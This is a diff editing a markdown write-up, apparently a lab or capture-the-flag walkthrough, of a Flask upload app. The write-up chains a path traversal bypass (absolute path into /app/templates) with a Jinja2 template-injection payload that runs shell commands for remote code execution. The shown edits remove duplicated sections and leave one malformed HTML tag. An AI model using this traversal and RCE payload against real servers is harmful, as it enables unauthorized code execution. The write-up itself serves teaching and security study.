@@ -96,7 +96,7 @@ def safe_filename(file):
     return file
 ```
 
-The `safe_filename()` function recursively checks for `../` in the filename and removes it if found. This aims to prevent directory traversal, but it's not effective. This can be simply by passed with `\u002e\` which is a unicode for `.`.
+- The `safe_filename()` function recursively checks for `../` in the filename and removes it if found. This aims to prevent directory traversal, but it's not effective. This can be simply bypassed with `\u002e\` which is a unicode for `.`.
 
 After sanitizing the filename, the code proceeds to check if the file extension is `mp3`. It does this by splitting the filename on the `.` character and checking whether the extension is equal to `'mp3'`. However, this method is flawed and can be easily bypassed with filenames like `bypassed.mp3.php`, where the `.mp3` is just a misleading part of the filename. This superficial check does not fully validate the actual file type.
 
@@ -113,30 +113,6 @@ However, here lies the main vulnerability: **`os.path.join()` is susceptible to 
 In summary, the vulnerability arises due to the incomplete sanitization process and the lack of final path validation, which makes the endpoint susceptible to path traversal attacks. We can exploit this to save files in unintended directories, gaining unauthorized control over the file structure.
 
 
-Now, let’s dive into the interesting part of the code. The `/upload` endpoint handles the upload of a `music_file` provided by the user. The uploaded file’s name is passed to the `safe_filename()` function to sanitize it.
-
-```python
-def safe_filename(file):
-    if '../' in file:
-        return safe_filename(file.replace('../', ''))
-    return file
-```
-
-The `safe_filename()` function recursively checks for `../` in the filename and removes it if found. This aims to prevent directory traversal, but let's see if it's actually effective.
-
-After sanitizing the filename, the code proceeds to check if the file extension is `mp3`. It does this by splitting the filename on the `.` character and checking whether the extension is equal to `'mp3'`. However, this method is flawed and can be easily bypassed with filenames like `bypassed.mp3.php`, where the `.mp3` is just a misleading part of the filename. This superficial check does not fully validate the actual file type.
-
-If the file passes the extension check, the following line of code is responsible for saving it:
-
-```python
-music_file.save(os.path.join(app.config['UPLOAD_FOLDER'], dst_file))
-```
-
-- The `os.path.join()` function joins the upload folder with the filename, creating the final upload path. In this application, `app.config['UPLOAD_FOLDER']` is set to `'./music_files/'`, which means that if the sanitized filename is `malicious.mp3`, the final save path would be `./music_files/malicious.mp3`.
-
-However, here lies the main vulnerability: **`os.path.join()` is susceptible to path traversal attacks** because there is no validation to ensure that the final path remains within the intended `music_files` directory. For example, if a malicious filename like `../../evil.mp3` is somehow provided, and not sanitized adequately, it could allow the file to be saved outside of the intended folder, potentially overwriting critical files or saving in unauthorized locations.
-
-In summary, the vulnerability arises due to the incomplete sanitization process and the lack of final path validation, which makes the endpoint susceptible to path traversal attacks. We can exploit this to save files in unintended directories, gaining unauthorized control over the file structure.
 
 # Exploitation
 
@@ -155,36 +131,6 @@ For the relative path method, we need `../` in our filename to reach the `templa
 
 This method is simpler because we don't need to bypass the `../` filter. We can simply provide the absolute path, which is `/app/templates/malicious.mp3.html`. The `os.path.join` will save it to the absolute path, effectively ignoring `app.config['UPLOAD_FOLDER']` because an absolute path takes precedence over a relative path.
 
-But what would be content of our `malicious.mp3.html`?
-
-I created simpler html file for ssti .
-
-```
-<html>
-<head>
-    <title>SSTI Exploit</title>
-</head>
-<body>
-    <h1>Triggering SSTI</h1>
-    <textarea type="text" id="page" name="page" value="{{7*7}}">
-</body>
-</html>
-```
-
-our ssti palyoad will be inside value attribule of text area . LEts first test it whether it is workign or not. 
-
-THe file is uploaded but how do we access it. ecause we can only see output only if malicious.mp3.html is rendered. bow how? here helps comes thiss lien fo code
-
-```render_template('home.html', page=f'{page}.html')```
-
-we can render our malicious.mp3.html by using page parameter like this
-
-``` http://your-instance-url/?page=malicious.mp3```
-
-This will render our html adn our output will be shown in textarea field 49.
-
-
-### Content of `malicious.mp3.html`
 
 To exploit the SSTI vulnerability, we need a simple HTML file that can trigger SSTI when rendered. Below is a straightforward HTML file for this purpose:
 
@@ -195,13 +141,12 @@ To exploit the SSTI vulnerability, we need a simple HTML file that can trigger S
 </head>
 <body>
     <h1>Triggering SSTI</h1>
-    <textarea type="text" id="page" name="page" value="{{7*7}}">
+    <textarea type="text" id="page" name="page" >{{7*7}}<textarea>
 </body>
 </html>
 ```
 
-In this file, our SSTI payload is placed inside the `value` attribute of the `<textarea>` element. This will evaluate the expression `{{7*7}}` if SSTI is present, allowing us to confirm that the vulnerability works.
-
+In this file, our SSTI payload is placed in the `<textarea>` element. This will evaluate the expression `{{7*7}}` if SSTI is present, allowing us to confirm that the vulnerability works.
 
 The file is uploaded, but how do we access it? We can only see the output if `malicious.mp3.html` is rendered. This is where the following line of code comes in handy:
 
@@ -216,61 +161,25 @@ http://your-instance-url/?page=malicious.mp3
 ```
 
 This will render our HTML, and the result of `7*7` (which is `49`) will be displayed in the `<textarea>` field, confirming that SSTI is successfully triggered.
-
-## Content of `malicious.mp3.html`
-
-To exploit the SSTI vulnerability, we need a simple HTML file that can trigger SSTI when rendered. Below is a straightforward HTML file for this purpose:
-
-```html
-<html>
-<head>
-    <title>SSTI Exploit</title>
-</head>
-<body>
-    <h1>Triggering SSTI</h1>
-    <textarea type="text" id="page" name="page" value="{{7*7}}">
-</body>
-</html>
-```
-
-In this file, our SSTI payload is placed inside the `value` attribute of the `<textarea>` element. This will evaluate the expression `{{7*7}}` if SSTI is present, allowing us to confirm that the vulnerability works.
-
-### Accessing `malicious.mp3.html`
-
-The file is uploaded, but how do we access it? We can only see the output if `malicious.mp3.html` is rendered. This is where the following line of code comes in handy:
-
-```python
-render_template('home.html', page=f'{page}.html')
-```
-
-We can render our `malicious.mp3.html` by passing the `page` parameter like this:
-
-```
-http://your-instance-url/?page=malicious.mp3
-```
-
-This will render our HTML, and the result of `7*7` (which is `49`) will be displayed in the `<textarea>` field, confirming that SSTI is successfully triggered.
-
-## Final Payload for SSTI
 
 Our final payload for SSTI will be:
 
 ```html
-{{config._class.init.globals_['os'].popen('id').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls -l /app').read()}}
 ```
 
 This payload will get Remote Code Execution (RCE) using SSTI.
 
-To execute this, simply replace the value of the `value` attribute with the final payload and re-upload the file. Here is how the updated HTML file looks:
+To execute this, simply replace the value and re-upload the file. Here is how the updated HTML file looks:
 
-```html
+```
 <html>
 <head>
     <title>SSTI Exploit</title>
 </head>
 <body>
     <h1>Triggering SSTI</h1>
-    <textarea type="text" id="page" name="page" value="{{config._class.init.globals_['os'].popen('ls -la /app').read()}}"></textarea>
+    <textarea type="text" id="page" name="page" >{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}</textarea>
 </body>
 </html>
 ```
@@ -281,7 +190,7 @@ After uploading, access the payload by visiting:
 http://your-instance-url/?page=malicious.mp3
 ```
 
-This will render the updated HTML and execute the command, showing the output of `ls -la /app` in the `<textarea>` field, thus achieving RCE.
+This will render the updated HTML and execute the command, showing the output of `ls -la` in the `<textarea>` field, thus achieving RCE.
 
 
 # Python Automated Script
